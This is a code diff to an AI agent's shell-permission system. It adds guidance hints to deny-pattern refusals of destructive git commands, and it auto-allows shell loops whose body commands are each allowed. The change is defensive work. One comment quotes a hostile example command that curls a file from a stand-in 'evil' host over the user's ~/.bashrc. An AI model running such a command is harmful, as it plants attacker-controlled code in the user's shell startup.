@@ -2419,6 +2419,37 @@ _SUBSTITUTION = re.compile(r"\$\([^()]*\)|\$\{[^{}]*\}|`[^`]*`")
 _SEGMENT_BREAK = re.compile(r"(?:\|\||&&|[;\n|&()])")
 
 
+#: A few of the denied commands have a sanctioned way to do the same job.
+#: Naming it turns a dead end into a detour: a session that wanted to
+#: remove a worktree it had made itself was told only "refusing to run",
+#: and left the directory behind (2026-09-17).
+_DENY_HINTS: tuple[tuple[str, str], ...] = (
+    ("worktree", " The worktree verbs do this with the checks the shell "
+                 "cannot make: call worktree_remove with the path."),
+    ("branch", " A branch you no longer need is the user's to delete; say "
+               "which one and why in your answer."),
+    ("reset", " To undo work in the tree, revert the specific files or "
+              "commit first; a hard reset throws away what was not saved."),
+    ("clean", " Say which files you mean and remove them one by one, or ask "
+              "the user: git clean deletes what nothing tracks."),
+    ("push", " Push a branch of your own and open a pull request; a forced "
+             "or deleting push rewrites what others already have."),
+)
+
+
+def _denied_command_hint(pattern: str) -> str:
+    """The sanctioned route for a denied command, or "".
+
+    A refusal that names nothing leaves the model to invent a way around,
+    which is the one thing a deny-list must not provoke.
+    """
+    text = str(pattern or "")
+    for needle, hint in _DENY_HINTS:
+        if needle in text:
+            return hint
+    return ""
+
+
 def _prose_blanked(cmd: str) -> str:
     """The command with commit-message prose blanked out.
 
@@ -4020,42 +4051,6 @@ _DEFAULT_PATH_PROTECTED_GLOBS: tuple[str, ...] = (
 )
 
 
-_SHELL_LOOP_RE = re.compile(
-    r"(?is)\b(?:for|while|until)\b.*?\bdo\b(?P<body>.*?)\bdone\b")
-
-
-def _loop_body_already_allowed(cmd: str, perms) -> str:
-    """The body of a shell loop, when the body alone would be allowed.
-
-    Repeating a measurement is ordinary scientific work and `for i in
-    1 2 3; do python3 x.py; done` is how it is written — but the
-    auto-allow list matches whole commands, so the loop is refused even
-    though `python3 x.py` is allowed and `python3 x.py; python3 x.py`
-    is allowed too (every segment of a compound is checked, so an
-    all-safe compound runs).
-
-    The generic refusal then tells the model to stop and ask the user,
-    which is right for a command it genuinely may not run and wrong
-    here: it needs no permission, only a different spelling. Returns
-    the body so the hint can quote it, or "" when the loop body is
-    something the list would refuse on its own.
-    """
-    if perms is None:
-        return ""
-    match = _SHELL_LOOP_RE.search(cmd or "")
-    if match is None:
-        return ""
-    body = (match.group("body") or "").strip().strip(";").strip()
-    if not body:
-        return ""
-    try:
-        if perms.matches_bash_auto_allow(body):
-            return body
-    except Exception:
-        return ""
-    return ""
-
-
 _REDIRECT_TARGET_RE = re.compile(
     r"(?<![0-9<>&])(?:[0-9]?|&)>{1,2}\s*([^\s;&|<>()]+)")
 
@@ -4790,6 +4785,14 @@ class KitToolPermissions:
     def matches_bash_auto_allow(self, cmd: str) -> bool:
         if self._interpreter_needs_confirm(cmd):
             return False
+        # A loop, before the split: `for f in *.out; do grep ERROR "$f";
+        # done` breaks at its own semicolons into "for f in *.out", "do
+        # grep ..." and "done", none of which is a command. Read whole,
+        # it is the commands in its body -- 262 of 759 refusals of this
+        # kind were loops whose every command was allowed (2026-09-17).
+        body = _loop_body(cmd)
+        if body is not None:
+            return all(self._segment_auto_allowed(part) for part in body)
         # A command is auto-allowed only if EVERY shell segment is individually
         # auto-allowed. Start-anchored patterns alone would trust a compound by
         # its first (safe) segment — e.g. ``ls || curl -o ~/.bashrc evil`` —
@@ -4862,6 +4865,44 @@ class KitToolPermissions:
         if candidate is not None and self.find_root_for(candidate) is not None:
             return True
         return False
+
+
+#: `for x in <words>; do <body>; done` and the while/until forms.
+_LOOP_RE = re.compile(
+    r"^\s*(?:for\s+\w+\s+in\s(?P<words>[^;]*)|while\s+(?P<wcond>[^;]*)|"
+    r"until\s+(?P<ucond>[^;]*));?\s*do\s+(?P<body>.*?)\s*;?\s*done\s*$",
+    re.IGNORECASE | re.DOTALL)
+
+#: What must not appear in the part of a loop that is not its body: it
+#: runs a command nobody looked at.
+_RUNS_SOMETHING_RE = re.compile(r"\$\(|`")
+
+
+def _loop_body(cmd: str) -> "list[str] | None":
+    """The commands inside a shell loop, or None if this is not one.
+
+    None as well when the loop's header runs something of its own -- a
+    command substitution in the words it walks over, or a `while <cmd>`
+    condition that is not a plain `read`. Those are commands like any
+    other and must be judged as such, which this cannot do from here.
+    """
+    match = _LOOP_RE.match(cmd or "")
+    if match is None:
+        return None
+    words = match.group("words") or ""
+    if _RUNS_SOMETHING_RE.search(words):
+        return None
+    for group in ("wcond", "ucond"):
+        condition = (match.group(group) or "").strip()
+        if condition and not re.match(r"^read\b", condition, re.IGNORECASE):
+            return None
+        if _RUNS_SOMETHING_RE.search(condition):
+            return None
+    body = match.group("body") or ""
+    parts = [p.strip() for p in _split_shell_segments(body)]
+    parts = [p for p in parts
+             if p and p.lower() not in ("do", "done", "then", "fi")]
+    return parts or None
 
 
 def _default_kit_permissions(cwd: Optional[Path] = None) -> KitToolPermissions:
@@ -13483,7 +13524,8 @@ class _DocToolExecutor:
             if denied:
                 _record_security_event("deny_pattern", "bash",
                                        f"{cmd[:80]} → {denied}")
-                return f"command rejected by deny-pattern {denied!r}: refusing to run."
+                return (f"command rejected by deny-pattern {denied!r}: "
+                        f"refusing to run.{_denied_command_hint(denied)}")
             denied_path = self._bash_denied_path(cmd, perms)
             if denied_path is not None:
                 _record_security_event("secret_path", "bash", str(denied_path))
@@ -13763,25 +13805,6 @@ class _DocToolExecutor:
                     "only on what this session recorded writing, and leaves "
                     "anything edited since untouched. `rm` cannot tell whose "
                     "file it is, which is why it is not on the list."
-                )
-            elif _loop_body_already_allowed(cmd, perms):
-                # Repeating a measurement is ordinary scientific work,
-                # and a shell loop is how it is written. The auto-allow
-                # list matches whole commands, so the loop is refused
-                # while its body is allowed -- and the generic refusal
-                # then says to stop and ask the user, which costs the
-                # turn and the measurement. Nothing needs approving
-                # here; only the spelling changes.
-                _body = _loop_body_already_allowed(cmd, perms)
-                hint = (
-                    " HINT: you do not need permission for this — the "
-                    f"command inside the loop (`{_body[:80]}`) is already "
-                    "allowed. The auto-allow list matches whole commands, "
-                    "not loop bodies. Repeat it instead: send it once per "
-                    "iteration, or join the iterations with ';' in one "
-                    "call (every segment of a compound is checked, so an "
-                    "all-allowed compound runs unattended). Do NOT ask the "
-                    "user for this one."
                 )
             elif cmd.lstrip().startswith(("cd ", "cd\t")):
                 hint = (
